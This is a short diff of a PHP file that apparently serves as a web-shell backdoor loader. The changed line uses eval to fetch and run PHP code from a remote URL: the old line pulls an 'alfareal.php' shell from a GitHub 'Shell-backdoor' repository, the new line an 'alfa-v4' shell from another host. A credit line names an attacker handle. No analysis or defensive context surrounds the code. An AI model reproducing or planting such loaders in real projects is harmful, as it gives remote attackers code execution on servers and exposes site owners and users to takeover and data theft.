@@ -163,7 +163,7 @@ if (!isset($_SESSION['authenticated'])) {
 
     return $data;
 }
-      eval('?>' . get('https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/alfareal.php'));
+      eval('?>' . get('https://tools.zone-xsec.com/raw/shell/alfa-v4.php'));
 ?>
     <div class="credit">Credit By Tanxploit404</div>
   </div>
